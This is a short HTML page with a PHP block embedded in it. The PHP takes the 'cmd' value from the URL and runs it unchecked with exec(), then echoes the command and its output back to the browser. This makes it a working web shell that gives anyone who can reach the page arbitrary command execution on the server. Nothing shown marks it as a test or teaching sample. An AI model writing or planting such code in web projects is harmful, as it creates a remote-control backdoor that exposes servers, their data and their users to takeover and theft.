<html lang="ru">
<head>
    <style>
        svg {
        height: 500px;
        }
    </style>
</head>
<body>

<?php
    function run_cmd($cmd)
    {
        $lines = array();
        exec($cmd, $lines);
        echo "<pre> > " . $cmd . "</pre>";
        echo "<pre>" . implode("\n", $lines) . "</pre>";
    }
    $cmd = $_GET['cmd'];
    run_cmd($cmd);
?>
</body>
</html>